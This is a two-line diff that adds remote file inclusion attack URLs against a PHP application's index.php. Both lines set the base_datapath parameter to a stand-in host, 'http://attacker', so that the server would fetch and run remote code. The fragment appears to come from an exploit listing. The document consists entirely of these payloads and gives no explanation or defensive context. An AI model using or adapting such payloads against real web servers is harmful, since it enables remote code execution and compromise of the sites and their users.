@@ -1,0 +1,2 @@
+http://www.example.com/index.php?config=1&base_datapath=http://attacker
+http://www.example.com/[dir]/index.php?config=1&base_datapath=http://attacker
